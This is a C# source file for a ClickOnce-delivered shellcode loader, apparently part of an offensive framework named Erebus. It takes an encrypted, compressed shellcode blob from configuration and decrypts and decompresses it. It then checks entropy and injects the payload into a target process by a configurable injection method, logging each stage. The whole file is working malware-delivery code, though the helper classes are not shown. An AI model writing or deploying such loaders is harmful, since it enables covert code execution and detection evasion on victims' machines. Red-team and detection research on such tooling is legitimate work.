using Erebus.ClickOnce;
using System.Runtime.Versioning;

namespace ShellcodeLoader
{
    public class ClickOnceLoader
    {
        [STAThread]
        [SupportedOSPlatform("windows")]
        public static void Main(string[] args)
        {
            // Load configuration
            string injectionMethod = InjectionConfig.InjectionMethod;
            int targetPid = InjectionConfig.TargetPID;
            byte[] key = InjectionConfig.EncryptionKey;
            byte[] shellcode = InjectionConfig.Shellcode;

            DebugLogger.WriteLine($"[*] Injection Method: {injectionMethod}");
            if (targetPid > 0)
                DebugLogger.WriteLine($"[*] Target PID: {targetPid}");

            // Get encrypted shellcode
            // byte[] shellcode = ErebusRsrc.erebus_bin;
            DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");

            // ============================================================
            // DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
            // ============================================================

            // STEP 1: DECODE (String-based encoding detection and decoding)
            DebugLogger.WriteLine("\n[*] STEP 1: Analyzing encoding format...");
            // Note: If shellcode is stored as encoded string, decode it first
            // This would typically be handled if the shellcode is base64/ascii85/etc encoded

            // STEP 2: DECRYPT (Automatic encryption detection and decryption)
            DebugLogger.WriteLine("[*] STEP 2: Detecting and decrypting shellcode...");
            shellcode = DecryptionUtils.AutoDetectAndDecrypt(shellcode, key);

            // STEP 3: DECOMPRESS (Binary compression detection and decompression)
            DebugLogger.WriteLine("[*] STEP 3: Analyzing compression format...");
            shellcode = CompressionDecodingUtils.AutoDetectAndDecode(shellcode);
            DebugLogger.WriteLine($"[+] Final shellcode size: {shellcode.Length} bytes");

            // Final entropy check
            int finalEntropy = DecryptionUtils.CalculateEntropyScore(shellcode);
            DebugLogger.WriteLine($"[*] Final entropy score: {finalEntropy}/100");

            // Execute injection
            try
            {
                IInjectionMethod injector = InjectionFactory.GetInjectionMethod(injectionMethod);
                DebugLogger.WriteLine($"\n[+] Using: {injector.Name}");
                DebugLogger.WriteLine($"[+] Description: {injector.Description}");
                DebugLogger.WriteLine("");

                bool success = injector.Inject(shellcode, targetPid);

                if (success)
                {
                    DebugLogger.WriteLine("\n[+] Injection completed successfully!");
                }
                else
                {
                    DebugLogger.WriteLine("\n[-] Injection failed!");
                    Environment.Exit(1);
                }
            }
            catch (Exception ex)
            {
                DebugLogger.WriteLine($"\n[-] Error: {ex.Message}");
                Environment.Exit(1);
            }
        }
    }
}
